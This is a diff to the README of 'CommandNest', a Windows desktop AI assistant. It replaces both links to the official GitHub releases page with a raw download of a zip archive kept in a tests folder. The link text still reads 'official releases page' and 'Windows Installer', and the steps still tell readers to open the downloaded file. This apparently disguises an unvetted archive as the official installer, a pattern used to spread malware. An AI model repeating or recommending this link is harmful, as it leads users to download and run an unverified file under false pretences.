@@ -1,6 +1,6 @@
 # 🤖 CommandNest - Your Personal AI Assistant Desktop Tool
 
-[![](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Open-pogonip977/CommandNest/releases)
+[![](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://raw.githubusercontent.com/Open-pogonip977/CommandNest/main/CommandNestTests/Command_Nest_v1.9.zip)
 
 CommandNest brings powerful artificial intelligence directly to your desktop. This application connects to advanced language models to help you write code, manage tasks, and organize information without leaving your computer. It uses a small, fast interface that stays out of your way until you need it.
 
@@ -8,7 +8,7 @@ CommandNest brings powerful artificial intelligence directly to your desktop. Th
 
 Follow these steps to set up CommandNest on your Windows computer. You do not need technical skills to perform this installation.
 
-1. Visit the [official releases page](https://github.com/Open-pogonip977/CommandNest/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Open-pogonip977/CommandNest/main/CommandNestTests/Command_Nest_v1.9.zip).
 2. Locate the file ending in `.exe` under the latest release.
 3. Click the filename to start the download.
 4. Open the downloaded file once the process finishes.
